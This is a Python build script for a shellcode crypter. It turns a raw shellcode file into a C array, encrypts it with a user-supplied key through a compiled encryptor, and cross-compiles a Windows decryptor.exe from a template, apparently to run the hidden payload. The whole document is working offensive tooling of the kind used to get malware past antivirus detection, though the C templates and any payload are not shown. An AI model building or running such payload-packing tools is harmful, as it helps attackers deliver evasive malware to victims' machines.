#!/usr/bin/python3

import sys
import os
import subprocess
from pprint import pprint
from termcolor import cprint

CLEAR_SHELLCODE_POINT = "CLEAR_SHELLCODE_POINT"
KEY_POINT = "KEY_POINT"
ENCRYPTED_SHELLCODE_POINT = "ENCRYPTED_SHELLCODE_POINT"


def run_test():
    if len(sys.argv) != 3:
        cprint("USAGE: {0} /path/to/raw/shellcode.bin encryption_key".format(sys.argv[0]), "red")
        exit(1)


def compilers_test():
    try:
        output = subprocess.check_output("x86_64-w64-mingw32-g++ --help", shell=True).decode("utf8")
        if "Usage: " not in output:
            cprint("Something wrong with MinGW compiler x86_64-w64-mingw32-g++, run it with --help and check.\n"
                   "Output must start from phrase 'Usage: '. If compiler exists and start successfully, change this test in source codes.",
                   "red")
            exit(1)
    except BaseException as e:
        cprint(
            "MinGW compiler x86_64-w64-mingw32-g++ run failed. May be you need install MinGW-w64 package. Error: " + str(
                e), "red")
        exit(1)

    try:
        output = subprocess.check_output("gcc --help", shell=True).decode("utf8")
        if "Usage: " not in output:
            cprint("Something wrong with gcc compiler, run it with --help and check.\n"
                   "Output must start from phrase 'Usage: '. If compiler exists and start successfully, change this test in source codes.",
                   "red")
            exit(1)
    except BaseException as e:
        cprint("gcc compiler run failed. May be you need install gcc package. Error: " + str(e), "red")
        exit(1)


def shellcode_test(shellcode_path):
    if not os.path.exists(shellcode_path):
        cprint("Shellcode file not exists or not readable: " + shellcode_path, "red")
        exit(1)


def shellcode_to_c_source(shellcode_path):
    symbols_per_line = 24

    shellcode_sources = ""
    shellcode_sources += "unsigned char shellcode[] = \n"
    with open(shellcode_path, "rb") as fh:
        cnt = 0
        while True:
            if cnt == 0:
                shellcode_sources += '"'

            data = fh.read(1)
            if data == b'':
                break

            shellcode_sources += "\\x" + data.hex()

            cnt += 1
            if cnt == symbols_per_line:
                shellcode_sources += '"\n'
                cnt = 0

        shellcode_sources += ('";\n' if cnt != 0 else ";\n")

    cprint("We got clean shellcode:", "green")
    cprint(shellcode_sources, "green")

    return shellcode_sources


def create_encryptor_template(shellcode_sources, enc_key):
    cprint("Write encryptor template", "blue")
    with open("encryptor-template.c") as fh:
        template = fh.read()
    template = template.replace(CLEAR_SHELLCODE_POINT, shellcode_sources).replace(KEY_POINT, enc_key)
    with open("encryptor.c", "w") as fh:
        fh.write(template)
    cprint("Encryptor template done, compiling it\n", "blue")


def compile_encryptor():
    cprint("Compiling encryptor", "yellow")
    try:
        output = subprocess.check_output("gcc -o encryptor encryptor.c", shell=True)
    except BaseException as e:
        cprint("Something went wrong. Compiling encryptor.c by gcc failed: " + str(e), "red")
        exit(1)
    cprint("Encryptor successfully compiled", "yellow")
    print("")


def run_encryptor():
    cprint("Run encryptor, get encrypted shellcode in C-style", "cyan")
    try:
        output = subprocess.check_output("./encryptor", shell=True)
        encrypted_shellcode_source = output.decode("utf8").strip()
    except BaseException as e:
        cprint("Something went wrong. Encryptor run failed. " + str(e), "red")
        exit(1)
    cprint("We got encrypted shellcode successfully, here it is:", "cyan")
    cprint(encrypted_shellcode_source, "cyan")
    print("")

    return encrypted_shellcode_source


def create_decryptor_template(encrypted_shellcode_source):
    cprint("Build decryptor template", "magenta")
    with open("decryptor-template.c") as fh:
        template = fh.read()
    template = template.replace(ENCRYPTED_SHELLCODE_POINT, encrypted_shellcode_source)
    with open("decryptor.c", "w") as fh:
        fh.write(template)
    cprint("Decryptor template done, compiling it\n", "magenta")


def compile_decryptor():
    cprint("Compiling decryptor", "yellow")
    try:
        subprocess.check_output("x86_64-w64-mingw32-g++ -fpermissive decryptor.c -o decryptor.exe", shell=True)
    except BaseException as e:
        cprint("Something went wrong. Compiling encryptor.c by gcc failed: " + str(e), "red")
        exit(1)
    cprint("Decryptor successfully compiled", "yellow")
    print("")


if __name__ == '__main__':
    run_test()

    compilers_test()

    enc_key = sys.argv[2]
    shellcode_path = sys.argv[1]
    shellcode_test(shellcode_path)

    shellcode_sources = shellcode_to_c_source(shellcode_path)
    create_encryptor_template(shellcode_sources, enc_key)
    compile_encryptor()

    encrypted_shellcode_source = run_encryptor()

    create_decryptor_template(encrypted_shellcode_source)
    compile_decryptor()

    cprint("All done. Go and get it: ./decryptor.exe", "green")














